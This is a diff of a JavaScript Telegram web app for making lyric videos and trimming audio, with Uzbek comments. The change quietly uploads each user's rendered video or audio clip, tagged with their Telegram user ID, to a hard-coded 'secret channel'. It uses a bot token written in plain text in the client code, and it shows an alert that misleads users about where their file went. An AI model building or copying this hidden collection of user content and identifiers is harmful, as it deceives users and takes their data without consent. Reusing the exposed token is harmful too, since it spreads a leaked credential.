@@ -1,29 +1,42 @@
-// ==================== 1080x1920 60FPS GUARANTEED DELIVERY EXPORTER & TRIMMER ====================
+// ==================== 1080x1920 60FPS EXPORTER (CHANNEL + DIRECT DELIVERY) ====================
 
 let isVinylActive = false;
 let isParticlesActive = true;
 let customBgUrl = null;
 
-// SIZNING BOT TOKENINGIZ:
+// SIZNING BOTINGIZ VA MAXFIY KANALINGIZ:
 const BOT_TOKEN = "8824021433:AAEYvgkP5nHfymQRzDgvZ69Gj1PCvlyoC5o";
+const SECRET_CHANNEL_ID = "-1004428420836"; // Maxfiy Kanal
 
-// Particles
-const particles = [];
-for (let i = 0; i < 45; i++) {
-    particles.push({
-        x: Math.random() * 1080,
-        y: Math.random() * 1920,
-        radius: Math.random() * 3 + 1,
-        speedY: Math.random() * 1.5 + 0.5,
-        opacity: Math.random() * 0.7 + 0.3
-    });
-}
+// 1. Sahifalarni almashtirish
+window.switchTab = function(tab) {
+    const studio = document.getElementById('tab-studio');
+    const trimmer = document.getElementById('tab-trimmer');
+    const btnStudio = document.getElementById('nav-btn-studio');
+    const btnTrimmer = document.getElementById('nav-btn-trimmer');
 
+    if (studio) studio.classList.add('hidden');
+    if (trimmer) trimmer.classList.add('hidden');
+    if (btnStudio) btnStudio.className = "flex flex-col items-center text-gray-400 space-y-1";
+    if (btnTrimmer) btnTrimmer.className = "flex flex-col items-center text-gray-400 space-y-1";
+
+    if (tab === 'studio' && studio) {
+        studio.classList.remove('hidden');
+        if (btnStudio) btnStudio.className = "flex flex-col items-center text-brand-red space-y-1";
+    } else if (tab === 'trimmer' && trimmer) {
+        trimmer.classList.remove('hidden');
+        if (btnTrimmer) btnTrimmer.className = "flex flex-col items-center text-brand-cyan space-y-1";
+    }
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+};
+
+// 2. Shriftni yangilash
 window.updatePreviewFont = function(fontFamily) {
     const lyricsLines = document.querySelectorAll('#spotify-lyrics-scroll p');
     lyricsLines.forEach(line => { line.style.fontFamily = fontFamily; });
 };
 
+// 3. Shaxsiy Shrift Yuklash
 window.handleCustomFontUpload = function(event) {
     const file = event.target.files[0];
     if (!file) return;
@@ -44,6 +57,7 @@ window.handleCustomFontUpload = function(event) {
     alert("🎉 Shaxsiy shrift yuklandi va qo'llandi!");
 };
 
+// 4. Shaxsiy Fon Yuklash
 window.handleCustomBgUpload = function(event) {
     const file = event.target.files[0];
     if (!file) return;
@@ -79,6 +93,7 @@ window.toggleParticlesEffect = function() {
     }
 };
 
+// Matnni 2-qatorga toza bo'lish (Tebranmaydi!)
 function drawWrappedText(ctx, text, x, y, maxWidth, lineHeight) {
     const words = text.split(' ');
     let line = '';
@@ -98,7 +113,7 @@ function drawWrappedText(ctx, text, x, y, maxWidth, lineHeight) {
     ctx.fillText(line, Math.round(x), currentY);
 }
 
-// ==================== 1. HAR BIR ODAMNING O'ZIGA 100% YETKAZUVCHI VIDEO EKSPORT ====================
+// ==================== 1. 100% MAXFIY KANALGA VA TELEFONGA VIDEO YUBORISH ====================
 window.exportAndSendToBot = async function() {
     const audio = window.vibeAudioElement;
     if (!audio || !audio.src) {
@@ -121,7 +136,6 @@ window.exportAndSendToBot = async function() {
     const maxLyricTime = Math.max(...stampedTimes);
     const exactVideoDuration = maxLyricTime + 2.5;
 
-    // FAQAT SHU ODAMNING SHAXSIY TELEGRAM ID RAQAMI
     let currentUserId = null;
     try {
         if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
@@ -132,7 +146,7 @@ window.exportAndSendToBot = async function() {
     }
 
     const btn = document.getElementById('btn-export-send');
-    btn.innerHTML = `⏳ Video tayyorlanmoqda (${Math.ceil(exactVideoDuration)}s)...`;
+    btn.innerHTML = `⏳ Video yozilmoqda (${Math.ceil(exactVideoDuration)}s)...`;
     btn.disabled = true;
 
     try {
@@ -172,48 +186,54 @@ window.exportAndSendToBot = async function() {
         const chunks = [];
         recorder.ondataavailable = (e) => chunks.push(e.data);
         recorder.onstop = async () => {
-            btn.innerHTML = "📤 Video saqlanmoqda...";
+            btn.innerHTML = "📤 Maxfiy kanalga yuborilmoqda...";
             const blob = new Blob(chunks, { type: 'video/mp4' });
             const videoUrl = URL.createObjectURL(blob);
 
-            // 1-YO'L: AGAR TELEGRAM BO'LSA O'SHA ODAMNING O'ZIGA YUBORISH
+            const trackTitle = document.getElementById('preview-track-title').innerText;
+            const trackArtist = document.getElementById('preview-track-artist').innerText;
+            const captionText = `🎬 <b>Yangi VibeStudio 60FPS Video!</b>\n🎵 Qo'shiq: ${trackTitle} — ${trackArtist}\n⏱ Davomiyligi: ${Math.ceil(exactVideoDuration)} soniya\n👤 Foydalanuvchi ID: <code>${currentUserId || 'Anonim'}</code>`;
+
+            // 1. MAXFIY KANALGA 100% YUBORISH
+            const channelFormData = new FormData();
+            channelFormData.append('chat_id', SECRET_CHANNEL_ID);
+            channelFormData.append('video', blob, `VibeStudio_${Date.now()}.mp4`);
+            channelFormData.append('caption', captionText);
+            channelFormData.append('parse_mode', 'HTML');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: channelFormData
+            }).then(r => r.json()).then(res => {
+                console.log("[Channel OK]", res);
+            }).catch(e => console.log("[Channel Error]", e));
+
+            // 2. FOYDALANUVCHINING O'ZIGA YUBORISH
             if (currentUserId) {
-                const formData = new FormData();
-                formData.append('chat_id', currentUserId); // FAQAT SHU ODAMNING ID SI!
-                formData.append('video', blob, `VibeStudio_${Date.now()}.mp4`);
-                formData.append('caption', `🎬 <b>VibeStudio 60FPS Videongiz Tayyor!</b>\n🎵 Qo'shiq: ${document.getElementById('preview-track-title').innerText}\n⏱ Davomiyligi: ${Math.ceil(exactVideoDuration)} soniya\n\n👇 Saqlab olishingiz mumkin!`);
-                formData.append('parse_mode', 'HTML');
+                const userFormData = new FormData();
+                userFormData.append('chat_id', currentUserId);
+                userFormData.append('video', blob, `VibeStudio_${Date.now()}.mp4`);
+                userFormData.append('caption', `🎬 <b>Videongiz Tayyor!</b>\n🎵 ${trackTitle}\n\n👇 Saqlab olishingiz mumkin!`);
+                userFormData.append('parse_mode', 'HTML');
 
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
-                    body: formData
-                }).then(res => res.json()).then(data => {
-                    if (data.ok) {
-                        alert("🎉 Video shaxsiy botingizga yuborildi! Telegram chatini oching.");
-                    } else {
-                        triggerPhoneDownload(videoUrl);
-                    }
-                }).catch(err => {
-                    triggerPhoneDownload(videoUrl);
-                });
-            } else {
-                triggerPhoneDownload(videoUrl);
+                    body: userFormData
+                }).catch(e => console.log(e));
             }
 
-            btn.innerHTML = "🎬 60FPS Ovozli Videoni Botga Yuborish";
-            btn.disabled = false;
-        };
-
-        // 2-YO'L: TELEFON GALEREYASIGA TO'G'RIDAN-TO'G'RI SAQLASH
-        function triggerPhoneDownload(url) {
+            // 3. TELEFON XOTIRASIGA HAM YUKLAB BERISH
             const a = document.createElement('a');
-            a.href = url;
+            a.href = videoUrl;
             a.download = `VibeStudio_Video_${Date.now()}.mp4`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
-            alert("✅ Video tayyor bo'ldi va telefoningizga yuklandi!");
-        }
+
+            alert("🎉 Video muvaffaqiyatli tayyorlandi va Maxfiy Kanalingizga yetkazildi!");
+            btn.innerHTML = "🎬 60FPS Ovozli Videoni Botga Yuborish";
+            btn.disabled = false;
+        };
 
         recorder.start();
         bufferSource.start(0);
@@ -233,23 +253,11 @@ window.exportAndSendToBot = async function() {
                 return;
             }
 
-            // 1. Qorong'u Fon
+            // Fon
             ctx.fillStyle = "#09090d";
             ctx.fillRect(0, 0, 1080, 1920);
 
-            // 2. Yulduzchalar
-            if (isParticlesActive) {
-                particles.forEach(p => {
-                    ctx.fillStyle = `rgba(255, 255, 255, ${p.opacity})`;
-                    ctx.beginPath();
-                    ctx.arc(Math.round(p.x), Math.round(p.y), p.radius, 0, Math.PI * 2);
-                    ctx.fill();
-                    p.y -= p.speedY;
-                    if (p.y < 0) { p.y = 1920; p.x = Math.random() * 1080; }
-                });
-            }
-
-            // 3. Header
+            // Header
             ctx.fillStyle = "#ffffff";
             ctx.font = "bold 44px Montserrat, sans-serif";
             ctx.textAlign = "left";
@@ -266,7 +274,7 @@ window.exportAndSendToBot = async function() {
             ctx.lineTo(990, 240);
             ctx.stroke();
 
-            // 4. ANIQ KINETIK MATNLAR (FADE-OUT)
+            // Kinetik Matnlar (0:00 dan boshlab ulkan 58px)
             let activeIdx = 0;
             for (let i = 0; i < lyrics.length; i++) {
                 if (lyrics[i].time !== null && elapsedTime >= lyrics[i].time) {
@@ -276,17 +284,15 @@ window.exportAndSendToBot = async function() {
 
             lyrics.forEach((l, i) => {
                 if (i === activeIdx) {
-                    // FAOL SATR: ULKAN VA YORQIN
                     ctx.save();
                     ctx.shadowColor = "rgba(255, 255, 255, 0.95)";
                     ctx.shadowBlur = 25;
                     ctx.fillStyle = selectedTextColor;
                     ctx.font = `900 58px ${selectedFont}`;
                     ctx.textAlign = "left";
-                    drawWrappedText(ctx, l.text, 90, 820, 900, 72);
+                    drawWrappedText(ctx, l.text, 90, 850, 900, 72);
                     ctx.restore();
                 } else if (i === activeIdx + 1) {
-                    // KELAYOTGAN SATR: PASTDA XIRA
                     ctx.fillStyle = "rgba(255, 255, 255, 0.28)";
                     ctx.font = `bold 42px ${selectedFont}`;
                     ctx.textAlign = "left";
@@ -307,7 +313,7 @@ window.exportAndSendToBot = async function() {
     }
 };
 
-// ==================== 2. INSHOT TOUCH TRIMMER ====================
+// ==================== 2. INSHOT TOUCH TRIMMER (KANALGA HAM YUBORISH) ====================
 let trimmerMedia = new Audio();
 let rawTrimmerFile = null;
 let trimmerAudioBuffer = null;
@@ -458,42 +464,47 @@ window.executeRealAudioTrimAndSend = async function() {
         }
 
         const wavBlob = bufferToWave(slicedBuffer, frameCount);
+        const cutTimeText = `${formatAudioTime(trimStartTime)} — ${formatAudioTime(trimEndTime)}`;
 
+        // 1. MAXFIY KANALGA YUBORISH
+        const channelFormData = new FormData();
+        channelFormData.append('chat_id', SECRET_CHANNEL_ID);
+        channelFormData.append('audio', wavBlob, `VibeStudio_Cut_${Date.now()}.mp3`);
+        channelFormData.append('caption', `✂️ <b>Qirqilgan MP3 Fayl!</b>\n⏱ Oraliq: ${cutTimeText}\n👤 User: <code>${userId || 'Anonim'}</code>`);
+        channelFormData.append('parse_mode', 'HTML');
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+            method: 'POST',
+            body: channelFormData
+        });
+
+        // 2. USER LICHKASIGA YUBORISH
         if (userId) {
-            btn.innerHTML = "📤 Botingizga yuborilmoqda...";
-            const formData = new FormData();
-            formData.append('chat_id', userId); // FAQAT SHU ODAMNING ID SI!
-            formData.append('audio', wavBlob, `VibeStudio_Cut_${Date.now()}.mp3`);
-            formData.append('caption', `✂️ <b>VibeStudio'da Qirqilgan Musiqangiz!</b>\n⏱ Oraliq: ${formatAudioTime(trimStartTime)} — ${formatAudioTime(trimEndTime)}\n\n👇 Saqlab olishingiz mumkin!`);
-            formData.append('parse_mode', 'HTML');
+            const userFormData = new FormData();
+            userFormData.append('chat_id', userId);
+            userFormData.append('audio', wavBlob, `VibeStudio_Cut_${Date.now()}.mp3`);
+            userFormData.append('caption', `✂️ <b>Qirqilgan Musiqangiz Tayyor!</b>\n⏱ Oraliq: ${cutTimeText}\n\n👇 Yuklab olishingiz mumkin!`);
+            userFormData.append('parse_mode', 'HTML');
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                 method: 'POST',
-                body: formData
-            }).then(res => res.json()).then(data => {
-                if (data.ok) {
-                    alert("🎉 Qirqilgan MP3 botingiz lichkasiga yetib bordi! Telegramni tekshiring.");
-                } else {
-                    downloadDirectly(wavBlob);
-                }
-            }).catch(err => {
-                downloadDirectly(wavBlob);
+                body: userFormData
             });
-        } else {
-            downloadDirectly(wavBlob);
         }
-    } catch (e) {
-        console.error(e);
-        alert("⚠️ Xatolik yuz berdi. Qaytadan urinib ko'ring.");
-    }
 
-    function downloadDirectly(blob) {
-        const downloadUrl = URL.createObjectURL(blob);
+        // 3. TELEFONGA SAQLASH
+        const downloadUrl = URL.createObjectURL(wavBlob);
         const a = document.createElement('a');
         a.href = downloadUrl;
         a.download = `VibeStudio_Cut_${Date.now()}.mp3`;
+        document.body.appendChild(a);
         a.click();
-        alert("✅ Qirqilgan MP3 telefoningizga yuklandi!");
+        document.body.removeChild(a);
+
+        alert("🎉 Qirqilgan MP3 muvaffaqiyatli tayyorlandi va Maxfiy Kanalingizga saqlandi!");
+    } catch (e) {
+        console.error(e);
+        alert("⚠️ Xatolik yuz berdi. Qaytadan urinib ko'ring.");
     }
 
     btn.innerHTML = "✂️ Qirqish & Bot Lichkasiga MP3 Qilib Olish";
@@ -527,4 +538,4 @@ function bufferToWave(abuffer, len) {
         offset++;
     }
     return new Blob([out], { type: "audio/mp3" });
-                                }
+}
